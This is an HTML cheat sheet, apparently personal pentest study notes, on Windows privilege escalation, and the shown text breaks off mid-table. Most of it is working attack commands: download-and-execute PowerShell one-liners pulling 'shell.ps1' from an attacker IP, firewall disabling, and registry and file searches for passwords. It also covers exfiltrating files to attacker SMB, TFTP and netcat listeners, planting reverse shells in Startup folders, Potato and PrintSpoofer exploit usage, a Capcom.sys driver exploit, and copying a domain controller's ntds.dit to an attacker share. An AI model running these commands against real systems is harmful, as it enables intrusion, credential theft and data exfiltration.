<html>
<head>
    <title>Windows PrivEsc</title>
    <a href="https://pusher91.github.io/Blog/">Return to Main Page</a>
</head>

<hr>

<body>

    <h2>Manual PrivEsc:</h2>
    <li>Use rlwrap on shell to enable arrow usage (up and down to navigate previous commands, left and right to navigate text)</li>
    <li>Check user groups and privileges</li>
    <ul>
        <li>whoami</li>
        <li>whoami /all</li>
        <li>whoami /priv</li>
        <li>whoami /groups</li>
        <li>net user &lt;username&gt;</li>
        <ul>
            <li>Get info about a specific user</li>
        </ul>
    </ul>
    <li>Kernel exploit</li>
    <ul>
        <li>Google the last installed "hotfix + exploit"</li>
    </ul>
    <li>Check folders</li>
    <ul>
        <li>Look for interesting files</li>
        <li>C:\Users\*</li>
        <li>C:\Program Files\</li>
        <li>C:\Program Files (x86)\</li>
    </ul>
    <li>Autologon creds</li>
    <ul>
        <li>get-item -path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"</li>
        <li>reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
    </ul>
    <li>Check running processes, pay attention to admin</li>
    <ul>
        <li>tasklist /V</li>
        <li>Most application exploits are the same as other misconfigurations (weak folder configurations, unquoted service paths, etc)</li>
    </ul>
    <li>Open ports</li>
    <ul>
        <li>netstat -an</li>
        <ul>
            <li>Ports listening on local host</li>
            <li>Ones not listed during nmap scan/firewalled</li>
        </ul>
    </ul>
    <li>Look for Group Policy (GPP) passwords</li>
    <ul>
        <li>Installed programs/applications</li>
        <ul>
            <li>List applications that are installed by the Windows Installer</li>
            <ul>
                <li>wmic product get name, version, vendor</li>
            </ul>
        </ul>
    </ul>
    <li>Insecure Services</li>
    <ul>
        <li>AllAccess, Start</li>
        <ul>
            <li>Change binpath</li>
        </ul>
    </ul>
    <li>Startup Apps/autorun</li>
    <ul>
        <li>Important if we can reboot the box</li>
    </ul>
    <li>Privilege Abuse</li>
    <ul>
        <li>SeLoadDriverPrivilege</li>
        <li>SeImpersonatePrivilege</li>
        <li>SeImpersonatePrivilege</li>
        <li>SeAssignPrimaryPrivilege</li>
        <li>SeTcbPrivilege</li>
        <li>SeBackupPrivilege</li>
        <ul>
            <li>https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</li>
        </ul>
        <li>SeRestorePrivilege</li>
        <li>SeCreateTokenPrivilege</li>
        <li>SeLoadDriverPrivilege</li>
        <li>SeTakeOwnershipPrivilege</li>
        <li>SeDebugPrivilege</li>
        <li>Article on exploiting privileges:https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</li>
    </ul>
    <li>Always Install Elevated</li>
    <li>Abuse GUI Program running as admin</li>
    <ul>
        <li>Inside application open file: file://c:/windows/system32/cmd.exe</li>
        <ul>
            <li>Might get admin command prompt</li>
        </ul>
    </ul>
    <li>Look for exploits for 3rd party drivers</li>
    <ul>
        <li>Enumerate drivers</li>
        <ul>
            <li>driverquery /v</li>
            <li>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</li>
        </ul>
        <li>Enumerate Driver Versions</li>
        <ul>
            <li>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</li>
        </ul>
    </ul>
    <li>Search the registry for keys and values that contain "password":</li>
    <ul>
        <li>reg query HKLM /f password /t REG_SZ /s</li>
        <li>reg query HKCU /f password /t REG_SZ /s</li>
        <li>reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
        <li>reg query "HKCU\software\simontatham\putty\sessions" /s</li>
        <li>reg query HKLM\System\ControlSet001\Control\CurrentPass</li>
        <li>reg query HKLM\System\ControlSet002\Control\CurrentPass</li>
        <li>HKLM\System\CurrentControlSet\Control\CurrentPass</li>
    </ul>
    <li>Scheduled Tasks</li>
    <ul>
        <li>schtasks /query /fo LIST /v</li>
    </ul>
    <li>mysql</li>
    <ul>
        <li>run commands as mysql user</li>
        <ul>
            <li>raptor_winudf</li>
        </ul>
        <li>Search for creds</li>
    </ul>
    <li>Login or run commands as other user using credentials or hashes</li>
    <ul>
        <li>Powershell</li>
        <li>psexec</li>
        <li>winrm</li>
        <li>wmiexec</li>
        <li>pth-winexe</li>
    </ul>
    <li>Check password attack vectors</li>
    <ul>
        <li>ASREPRoast</li>
        <li>Kerberoast</li>
    </ul>

    <br>

    <h2>PrivEsc Tools</h2>
    <li>Powerup.ps1</li>
    <ul>
        <li>IEX(New-Object Net.WebClient).downloadString('http://&lt;ip address&gt;/PowerUp.ps1&#039;)</li>
        <li>Invoke-AllChecks</li>
    </ul>
    <li>Winpeas</li>
    <li>Seatbelt</li>
    <li>Windows-Privesc-Checker</li>
    <li>Windows Exploit Suggester - Next Generation</li>
    <ul>
        <li>wesng.py /systeminfo.txt -i 'Elevation of Privilege' --exploits-only</li>
    </ul>
    <li>Metasploit</li>
    <li>Bloodhound</li>
    <ul>
        <li>Use against DC</li>
        <li>Clone repo for most up-to-date version</li>
        <ul>
            <li>Repo does not include the bloodhound executable, this must be downloaded separately from releases</li>
        </ul>
        <li>Usage instructions:</li>
        <ul>
            <li>Start neo4j on Kali</li>
            <ul>
                <li>run: neo4j console</li>
                <ul>
                    <li>Default credentials - neo4j:neo4j</li>
                    <ul>
                        <li>locate neo4j | grep auth</li>
                        <li>Delete Delete /usr/share/neo4j/data/dbms</li>
                    </ul>
                </ul>
            </ul>
            <li>Run collector/ingestor on victim AD DC machine</li>
            <ul>
                <li>Locally with executable: .\Sharphound.exe -c all</li>
                <li>Remotely using python: sudo python3 bloodhound.py -c all -u &lt;user&gt; -p &#039;&lt;password&gt;&#039; -ns &lt;ip&gt; -d &lt;domain name&gt; --zip</li>
            </ul>
            <li>Start bloodhound on Kali</li>
            <ul>
                <li>sudo ./Bloodhound --no-sandbox</li>
            </ul>
            <li>Drag and drop file generated by sharphound into Bloodhound window</li>
            <li>On top left where it says "Search for a node" enter the username that is being used on the victim machine</li>
            <li>right click icon in center with pwned victim machine user and "Mark User as Owned"</li>
            <li>Things to check under Queries/Analysis tab</li>
            <ul>
                <li>Shortest Paths from Kerberoastable Users</li>
                <li>Shortest path from Owned principles</li>
                <li>Shortest path to High Value Targets</li>
            </ul>
            <li>Can right click on account associations and select "Help" and it will give info how an AD association can be abused</li>
        </ul>
    </ul>
    <li>SharpCollection</li>
    <ul>
        <li>Common C# offensive tools that are checked for updates daily, and then compiled</li>
    </ul>

    <br>

    <h2>cmd</h2>
    <li>Location: C:\Windows\System32\cmd.exe</li>
    <li>Miscellaneous</li>
    <table>
        <tr>
            <td>grep string from output</td>
            <td>&lt;command&gt; | findstr</td>
        </tr>
    </table>
    <li>System Information & Control</li>
    <table>
        <tr>
            <td>show hostname</td>
            <td>hostname</td>
        </tr>
        <tr>
            <td>Restart</td>
            <td>shutdown -r -t 10 && exit<br><li>&& exit because an error message can pop up when initiating a restart with a shell still active.</li></td>
        </tr>
        <tr>
            <td>List system-wide updates</td>
            <td>wmic qfe get Caption, Description, HotFixID, InstalledOn</td>
        </tr>
        <tr>
            <td>List version and architecture</td>
            <td>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"</td>
        </tr>
        <tr>
            <td>List version and architecture</td>
            <td>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"</td>
        </tr>
        <tr>
            <td>Enumerate drivers installed</td>
            <td>driverquery /v</td>
        </tr>
    </table>
    <li>Applications & Services</li>
    <table>
        <tr>
            <td>List running services</td>
            <td>tasklist</td>
        </tr>
        <tr>
            <td>Running Processes & Services</td>
            <td>tasklist /SVC</td>
        </tr>
    </table>
    <li>User & Group Permissions</li>
    <table>
        <tr>
            <td>view current user</td>
            <td>whoami<br>echo %username%</td>
        </tr>
        <tr>
            <td>See all user accounts</td>
            <td>net user</td>
        </tr>
        <tr>
            <td>More details about specific account</td>
            <td>net user &lt;username&gt;</td>
        </tr>
        <tr>
            <td>View domain users</td>
            <td>net user /domain</td>
        </tr>
        <tr>
            <td>View local administrators group</td>
            <td>net localgroup Administrators</td>
        </tr>
        <tr>
            <td>View groups</td>
            <td>net group </td>
        </tr>
        <tr>
            <td>Shows all groups on the domain</td>
            <td>net group /domain</td>
        </tr>
        <tr>
            <td>net accounts</td>
            <td>Check accounts info (password lockout, etc)</td>
        </tr>
        <tr>
            <td>Add user</td>
            <td>net user &lt;username&gt; &lt;password&gt; /add</td>
        </tr>
        <tr>
            <td>Add user to domain</td>
            <td>net user &lt;username&gt; &lt;password&gt; /add /domain</td>
        </tr>
        <tr>
            <td>Change password</td>
            <td>net user &lt;username&gt; &lt;password&gt;</td>
        </tr>
        <tr>
            <td>View users in a group</td>
            <td>net group &quot;&lt;Group Name&gt;&quot;</td>
        </tr>
        <tr>
            <td>Add user to a group</td>
            <td>net group "Group Name" /add &lt;user&gt;</td>
        </tr>
        <tr>
            <td>Make user a local admin</td>
            <td>net localgroup administrators &lt;username&gt; /add</td>
        </tr>
        <tr>
            <td>Give full control of file to user</td>
            <td>cacls &lt;file&gt; /t /e /p &lt;user&gt;:F<br>- F = Full Control</td>
        </tr>
        <tr>
            <td>Remove access to file from user</td>
            <td>cacls &lt;file&gt; /r /e &lt;user&gt;</td>
        </tr>
    </table>
    <li>File System</li>
    <table>
        <tr>
            <td>Edit text document</td>
            <td>Copy con C:\file.txt</td>
        </tr>
        <tr>
            <td>Search for files</td>
            <td>dir &lt;file name&gt;
                <table>
                    <tr>
                        <td>/s</td>
                        <td>List all occurrences of the file in the specified directory and subdirectories</td>
                    </tr>
                    <tr>
                        <td>/r</td>
                        <td>Display alternate data streams of the file (files that are acting like folders and contain files inside of them)<br><li>If data stream files are found, display content with Powershell: (Get-Content < main file> -Stream &lt;File inside the file&gt;</li>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Find file</td>
            <td>where &lt;file name&gt;<br>where /r C:\ &lt;file name&gt;<br>where /R C:\ &lt;file name&gt;</td>
        </tr>
        <tr>
            <td>Mount smb share</td>
            <td>net use &lt;drive letter&gt;: \\&lt;SMB Server ip&gt;\&lt;smb share to mount&gt;</td>
        </tr>
        <tr>
            <td>List all drives that are currently mounted as well as unmounted but connected</td>
            <td>mountvol</td>
        </tr>
        <tr>
            <td>Analyze encrypted files</td>
            <td>cipher /c &lt;file&gt;</td>
        </tr>
        <tr>
            <td>Check file permissions</td>
            <td>cacls &lt;file&gt;</td>
        </tr>
    </table>
    <li>Networking</li>
    <table>
        <tr>
            <td>Disable firewall - New way</td>
            <td>netsh advfirewall set allprofiles state off</td>
        </tr>
        <tr>
            <td>Disable Firewall - Old way</td>
            <td>netsh firewall set opmode disable</td>
        </tr>
        <tr>
            <td>Disable firewall service (can only run as SYSTEM?)</td>
            <td>net stop mpssvc</td>
        </tr>
        <tr>
            <td>Current firewall profile</td>
            <td>netsh advfirewall show currentprofile</td>
        </tr>
        <tr>
            <td>Firewall rules</td>
            <td>netsh advfirewall firewall show rule name=all</td>
        </tr>
        <tr>
            <td>Show open ports</td>
            <td>netstat -ano</td>
        </tr>
        <tr>
            <td>Network Information</td>
            <td>ipconfig /all</td>
        </tr>
    </table>

    <h2>Powershell</h2>
    <li>System Information & Control</li>
    <table>
        <tr>
            <td>Enumerate drivers</td>
            <td>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</td>
        </tr>
        <tr>
            <td>Enumerate driver versions</td>
            <td>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</td>
        </tr>
        <tr>
            <td>Check operating system architecture</td>
            <td>[environment]::Is64BitOperatingSystem</td>
        </tr>
        <tr>
            <td>Check powershell session architecture</td>
            <td>[environment]::Is64BitProcess<br>
                <li>64-bit powershell</li>
                <ul>
                    <li>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe</li>
                </ul>
            </td>
        </tr>
        <tr>
            <td>Environment variabels</td>
            <td>dir env:</td>
        </tr>
        <tr>
            <td>Get time & date</td>
            <td>Get-Date</td>
        </tr>
        <tr>
            <td>Check execution mode</td>
            <td>$ExecutionContext.SessionState.LanguageMode</td>
        </tr>
        <tr>
            <td>Powershell history</td>
            <td>C:\Users\&lt;user&gt;\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</td>
        </tr>
    </table>
    <!--<li>Applications & Services</li>-->
    <li>User & Group Permissions</li>
    <table>
        <tr>
            <td>Create Credential Variable</td>
            <td>$pass = ConvertTo-SecureString &#039;&lt;password&gt;&#039; -AsPlainText -Force<br>$cred = New-Object System.Management.Automation.PSCredential(&#039;&lt;Username&gt;&#039;, $pass)</td>
        </tr>
        <tr>
            <td>Decrypt SecureString password to plaintext from CLI XML file.</td>
            <td>(Import-CliXml -Path user.txt).GetNetworkCredential().Password</td>
        </tr>
        <tr>
            <td>Query user information</td>
            <td>Get-ADUser &lt;user&gt; [-properties *]</td>
        </tr>
        <tr>
            <td>View service permissions</td>
            <td>$acl = get-acl HKLM:\System\CurrentControlSet\Services<br>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}</td>
        </tr>
    </table>
    <li>File System</li>
    <table>
        <tr>
            <td>Read file content</td>
            <td>Get-Content &lt;file name&gt;<br>gc &lt;file name&gt;</td>
        </tr>
        <tr>
            <td>Check file/folder permissions</td>
            <td>Get-ACL &lt;file/folder&gt; | Fl *</td>
        </tr>
        <tr>
            <td>View file contents</td>
            <td>(Get-Content &lt;file&gt;).substring(0,16)</td>
        </tr>
        <tr>
            <td>Search for file</td>
            <td>Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force</td>
        </tr>
        <tr>
            <td>Recursively show file names</td>
            <td>gci -recurse | select FullName</td>
        </tr>
        <tr>
            <td>Show only files</td>
            <td>gci -File</td>
        </tr>
        <tr>
            <td>Ignore errors</td>
            <td>-ErrorAction SilentlyContinue<br>ErrorAction ignore</td>
        </tr>
    </table>
    <!--<li>Networking</li>-->
    <li>Miscellaneous</li>
    <table>
        <tr>
            <td>Secretly run scripts</td>
            <td>powershell.exe -ExecutionPolicy Bypass –NoLogo –NonInteractive –NoProfile –File &lt;file.ps1&gt;</td>
        </tr>
        <tr>
            <td>enable colors</td>
            <td>reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</td>
        </tr>
        <tr>
            <td>dot-source / load all variables & functions from powershell script</td>
            <td>.\&lt;script&gt;.ps1<br>iex (New-Object System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</td>
        </tr>
    </table>

    <h2>File Transfers</h2>
    <li>Download to Windows</li>
    <table>
        <tr>
            <td>Base64 Decoding</td>
            <td><li>powershell -e &lt;base 64&gt;</li></td>
        </tr>
        <tr>
            <td>Download file</td>
            <td>
                <li>invoke-webrequest -Uri http://&lt;ip address&gt;/shell.exe [-OutFile &lt;file&gt;]</li>
                <li>IWR -Uri &lt;url&gt; [-OutFile &lt;file&gt;]</li>
            </td>
        </tr>
        <tr>
            <td>Download file with Powershell</td>
            <td>
                <li>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)</li>
                <li>powershell  &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)&quot;</li>
                <li>(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/shell.ps1&#039;,&lt;output directory and file name&gt;&#039;)</li>
                <li>wget &lt;url&gt; -outfile &lt;file name&gt;</li>
            </td>
        </tr>
        <tr>
            <td>Download file with cmd</td>
            <td>certutil -urlcache -split -f http://&lt;ip address&gt;/&lt;file name&gt; C:\\&lt;output directory and file name&gt;</td>
        </tr>
        <tr>
            <td>Download and run powershell script</td>
            <td>
                <li>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;</li>
                <li>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;</li>
                <li>IEX(IWR http:/&amp;lt;ip address&amp;gt;/shell.ps1 -UseBasicParsing)</li>
                <li>IEX(IWR(&lt;url&gt;))</li>
            </td>
        </tr>
        <tr>
            <td>SMB</td>
            <td>
                <li>Mount SMB share using powershell to new drive and using powershell credential object</li>
                <table>
                    <tr>
                        <td>Start SMB share on Kali</td>
                        <td>
                            <li>impacket-smbserver &lt;Share Name&gt; &lt;Directory of Share&gt; -smb2support -user &lt;Username to connect to share&gt; -password &lt;Password to connect to share&gt;</li>
                            <li>Some machines do not work with smb2support.  Other machines require it.</li>
                            <li>Credentials optional.  Can skip next step if not used.</li>
                        </td>
                    </tr>
                    <tr>
                        <td>Create SMB Share Credential Variable</td>
                        <td>
                            <li>$pass = ConvertTo-SecureString &#039;&lt;password&gt;&#039; -AsPlainText -Force</li>
                            <li>$cred = New-Object System.Management.Automation.PSCredential(&#039;&lt;Username&gt;&#039;, $pass)</li>
                            <ul>
                                <li>If it is a domain account then:</li>
                                <ul>
                                    <li>$cred = New-Object System.Management.Automation.PSCredential(&#039;&lt;Domain&gt;\&lt;Username&gt;&#039;, $pass)</li>
                                </ul>
                                <li>Verify $cred creation by echoing it</li>
                            </ul>
                        </td>
                    </tr>
                    <tr>
                        <td>Connect to SMB Share From Windows</td>
                        <td>
                            <li>New-PSDrive -Name &lt;Drive Name for SMB Share&gt; -PSProvider FileSystem -Credential $cred -Root \\&lt;ip of attacker&gt;\&lt;Share Name&gt;</li>
                            <li>If accessing the same share from multiple shells on the same windows machine it works best to give them each different drive names (-Name &lt;Name&gt;)</li>
                        </td>
                    </tr>
                    <tr>
                        <td>Open SMB Share on Windows</td>
                        <td>Simple type: &lt;Drive Name Assigned to SMB Share&gt;:</td>
                    </tr>
                </table>
                <li>Mount SMB share using cmd and simple credentials</li>
                <table>
                    <tr>
                        <td>Create SMB Share</td>
                        <td>sudo impacket-smbserver &lt;Share Name&gt; &lt;Share Directory&gt; -smb2support -user &lt;username&gt; -password &lt;password&gt;</td>
                    </tr>
                    <tr>
                        <td>Connect to share</td>
                        <td>net use \\&lt;ip address&gt;\&lt;share name&gt; /u:&lt;username&gt; &lt;password&gt;<br>net user x: \\&lt;ip&gt;\&lt;share name&gt; /u:&lt;user&gt; &lt;password&gt;</td>
                    </tr>
                    <tr>
                        <td>Open share</td>
                        <td>cd \\&lt;ip address&gt;\&lt;share name&gt;\</td>
                    </tr>
                </table>
                <li>Create SMB share using Linux's built-in SMB server</li>
                <table>
                    <tr>
                        <td>Create SMB Share (optional and self-explanatory parameters included)</td>
                        <td>sudo vi /etc/samba/smb.conf<br>[share]<br>comment = My Share<br>browseable = yes<br>path = /srv/SMB<br>read only = no<br>guest ok = yes<br>writable = yes<br>create mask = 0777</td>
                    </tr>
                    <tr>
                        <td>Might need to give SMB permissions to share directory</td>
                        <td>chmod 777 &lt;smb share directory&gt;<br>chmod 755 &lt;smb share directory&gt;</td>
                    </tr>
                    <tr>
                        <td>Start Share</td>
                        <td>service smbd restart</td>
                    </tr>
                </table>
                <li>Troubleshoot by using smbclient and access the SMB directory on our machine and attempt to retrieve or upload files.</li>
            </td>
        </tr>
    </table>

    <li>Upload to windows</li>
    <table>
        <tr>
            <td>Upload with Powershell to Web Server</td>
            <td>
                <li>Invoke-RestMethod -Method PUT -Uri &quot;http://&lt;ip address&gt;:&lt;port&gt;/&lt;file name&gt;&quot; -Body $variable</li>
                <li>powershell (New-Object System.Net.WebClient).UploadFile(&#039;http://&lt;ip address&gt;/&lt;file name&gt;&#039;, &#039;&lt;file name&gt;&#039;)</li>
            </td>
        </tr>
        <tr>
            <td>
                <li>Upload to tftp</li>
                <ul>
                    <li>tftp is only on Windows until XP & 2003</li>
                </ul>
            </td>
            <td>
                <table>
                    <tr>
                        <td>Setup TFTP on Kali</td>
                        <td>sudo apt install atftp</td>
                    </tr>
                    <tr>
                        <td>Create tftp Directory</td>
                        <td>sudo mkdir /tftp</td>
                    </tr>
                    <tr>
                        <td>Set owner "nobody" on tftp Directory</td>
                        <td>sudo chown nobody: /tftp</td>
                    </tr>
                    <tr>
                        <td>Activate tftp server on port 69</td>
                        <td>sudo atftpd --daemon --port 69 /tftp</td>
                    </tr>
                    <tr>
                        <td>Upload file from Windows to Linux</td>
                        <td>tftp -i &lt;ip address&gt; put file.txt</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Base64 Encoding</td>
            <td>
                <table>
                    <tr>
                        <td>base64 w/ powershell</td>
                        <td>
                            <li>$fc = Get-Content &lt;file&gt;</li>
                            <li>$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)</li>
                            <li>[System.Convert]::ToBase64String($fe)</li>
                        </td>
                    </tr>
                    <tr>
                        <td>Read file with Kali</td>
                        <td>echo -n &lt;base64 text&gt; | base64 -d</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Upload with powercat</td>
            <td>
                <table>
                    <tr>
                        <td>Set listener on receiving machine</td>
                        <td>nc -lvnp &lt;port #&gt; &gt; receiving_file.ps1</td>
                    </tr>
                    <tr>
                        <td>Send file with PowerCat</td>
                        <td>powercat -c &lt;ip address&gt; -p  &lt;port #&gt; -i C:\&lt;Directory and file name&gt;</td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>

    <h2>Startup Apps</h2>
    <li>Program for startup apps that should start for all users (including admin):</li>
    <ul>
        <li>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</li>
        <ul>
            <li>Directory</li>
            <li>if we have access, we can add a reverseShell.exe, and when admin logs in we will get a admin priv reverse shell.</li>
        </ul>
        <li>Check access to directory with accesschk.exe:</li>
        <ul>
            <li>accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"</li>
        </ul>
        <li>files in StartUp directory must be shortcuts (.lnk)</li>
        <ul>
            <li>VBScript to create a shortcut file:</li>
            <pre>
                Set oWS = WScript.CreateObject("WScript.Shell")
                sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
                Set oLink = oWS.CreateShortcut(sLinkFile)
                oLink.TargetPath = "C:\PrivEsc\reverse.exe"
                oLink.Save
            </pre>
        </ul>
        <li>cmd "cscript CreateShortCut.vbs"</li>
    </ul>

    <h2>Prilivege Abuse</h2>
    <li>SeImpersonatePrivilege</li>
    <li>Rotten Potato</li>
    <ul>
        <li>Works up until sometime in 2019. </li>
        <li>Patched on latest Windows 10.</li>
    </ul>
    <li>Juicy Potato</li>
    <ul>
        <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
    </ul>

    <li>Rogue Potato</li>
    <ul>
        <li>More advanced and complicated than previous potato exploits.</li>
        <li>Instructions</li>
        <ul>
            <li>Listener on Kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:&lt;Victim ip address&gt;:9999</li>
            <li>On victim Windows machine: RoguePotato.exe -r 10.0.0.5 -l 9999 -e "C:\windows\system32\cmd.exe"</li>
        </ul>
    </ul>
    <li>PrintSpoofer</li>
    <ul>
        <li>Targets print spooler service</li>
        <li>Does not require any port forwarding like potato exploits.</li>
        <li>The entire exploit runs on the target machine. </li>
        <li>Requires C++ redistributable is installed.</li>
        <li>PrintSpoofer.exe -i -c "C:\reverse\shell.exe"</li>
    </ul>
    <li>SeAssignPrimaryTokenPrivilege</li>
    <ul>
        <li>Potato Exploits (SeImpersonatePrivilege)</li>
    </ul>
    <li>SeLoadDriverPrivilege</li>
    <ul>
        <li>Download these files:</li>
        <ul>
            <li>Capcom.sys from fuzzysecurity</li>
            <li>https://github.com/TarlogicSecurity/EoPLoadDriver/</li>
            <ul>
                <li>eoploaddriver.cpp</li>
            </ul>
            <li>Exploitcapcom from github</li>
        </ul>
        <li>Compile EoPLoadDriver in visual studio</li>
        <ul>
            <li>Create a new project</li>
            <ul>
                <li>Console app</li>
                <li>Name it LoadDriver</li>
            </ul>
            <li>Open LoadDriver.cpp</li>
            <ul>
                <li>Replace all contents with contents from eoploaddriver.cpp</li>
            </ul>
            <li>Select "Release" and "x64"</li>
            <li>Build --> Rebuild Solution.  LoadDriver.exe should be created.</li>
        </ul>
        <li>Compile ExploitCapCom</li>
        <ul>
            <li>File --> Open -- Project/Solution</li>
            <ul>
                <li>Select Exploit Capcom</li>
                <li>Set "Release" and "x64"</li>
                <li>Rebuild solution</li>
                <li>ExploitCapCom.exe should be created</li>
            </ul>
        </ul>
        <li>Transfer ExploitCapCom.exe, LoadDriver.exe, and capcom.sys to victim machine</li>
        <ul>
            <li>LoadDriver.exe System\CurrentControlSet\MyService C:\&lt;path to capcom.sys&gt;</li>
            <li>.\ExploitCapCom.exe</li>
            <li>Should have system shell.</li>
        </ul>
    </ul>

    <li>SeBackupPrivilege</li>
    <ul>
        <li>Grants read access to all objects on the system regardless of ACL</li>
        <ul>
            <li>Read sensitive files</li>
            <li>Extract hashes</li>
            <ul>
                <li>Pass-the-hash</li>
                <li>Crack them</li>
            </ul>
        </ul>
        <li>Backup ntds file to SMB server</li>
        <table>
            <tr>
                <td>Create NTFS share on attacker</td>
                <td>
                    <table>
                        <tr>
                            <td>Create 2gb NTFS folder called ntfs.disk</td>
                            <td>dd if=/dev/zero of=ntfs.disk bs=1024M count=2</td>
                        </tr>
                        <tr>
                            <td>Create loopback setup</td>
                            <td>sudo losetup -fP ntfs.disk</td>
                        </tr>
                        <tr>
                            <td>Check losetup</td>
                            <td>losetup -a</td>
                        </tr>
                        <tr>
                            <td>Create NTFS disk</td>
                            <td>sudo mkfs.ntfs /dev/loop0</td>
                        </tr>
                        <tr>
                            <td>Mount NTFS disk to a folder</td>
                            <td>sudo mount /dev/loop0 ./smb</td>
                        </tr>
                        <tr>
                            <td>Edit SMB to setup SMB share</td>
                            <td>
                                <li>sudo vi /etc/samba/smb.conf</li>
                                <table>
                                    [shared]
                                    comment = &lt;anything&gt;
                                    browseable = yes
                                    path = &lt;local path to SMB share&gt;
                                    read only = no
                                    guest = yes
                                </table>
                            </td>
                        </tr>
                        <tr>
                            <td>Start smb share</td>
                            <td>sudo systemctl restart smbd</td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td>Backup ntds file from victim</td>
                <td>echo y | wbadmin start backup -backuptarget:\\&lt;ip address&gt;\share -include:C:\windows\ntds\</td>
            </tr>
            <tr>
                <td>extract contents of .vhdx on victim (using attacker SMB share)</td>
                <td>
                    <li>echo y | wbadmin start recovery -version:&lt;version&gt; -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl</li>
                    <li>Get version</li>
                    <ul>
                        <li>victim: "wbadmin get versions"</li>
                        <ul>
                            <li>Version identified:&lt;version&gt;</li>
                        </ul>
                    </ul>
                    <li>ntds.dit should be in C:\</li>
                </td>
            </tr>
        </table>
    </ul>

    <li>SeRestorePrivilege</li>
    <ul>
        <li>Grants write access to all objects on the system regardless of ACL</li>
        <li>Modify service binaries</li>
        <li>Overwrite DLLs used by SYSTEM processes</li>
        <li>Modify registry settings</li>
    </ul>

    <li>SeTakeOwnershipPrivilege</li>
    <ul>
        <li>Lets the owner take ownership over an object</li>
        <li>Same as SeRestorePrivilege after taking ownership of files</li>
    </ul>
    <li>More reading on token abuse: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</li>

    <br>

    <h2>Always Install Elevated</h2>
    <li>Check if enabled</li>
    <ul>
        <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
        <ul>
            <li>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</li>
        </ul>
        <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
        <ul>
            <li>reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated</li>
        </ul>
        <li>Create msi reverse shell and execute it</li>
    </ul>

    <h2>Autorun Applications</h2>
    <li>Enumerate Auto Run Programs</li>
    <ul>
        <li>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
        <li>check for write to file permissions</li>
        <ul>
            <li>accesschk.exe /accepteula -quvw &lt;user&gt; &lt;service&gt;</li>
        </ul>
    </ul>

    <h2>Insecure File Permissions</h2>
    <li>Look for files of any type that can help break into the system.  Scripts with hardcoded credentials, other sensitive files, etc.</li>
    <li>Search for world writable files:</li>
    <ul>
        <li>Accesschk.exe -uws "Everyone" "C:\Program Files"</li>
        <li>Powershell.exe "Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}"</li>
    </ul>
    <li>Configuration Files</li>
    <ul>
        <li>Look for files like Unattend.xml which might contain credentials</li>
        <li>Search for files with pass in the name or ending in .config</li>
        <ul>
            <li>dir /s *pass* == *.config</li>
        </ul>
    </ul>
    <li>Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:</li>
    <ul>
        <li>findstr /si password *.xml *.ini *.txt</li>
    </ul>

    <h2>Insecure Services</h2>
    <li>Manually enumerate insecure services</li>
    <table>
        <tr>
            <td>View user service permissions</td>
            <td>
                <li>$acl = get-acl HKLM:\System\CurrentControlSet\Services</li>
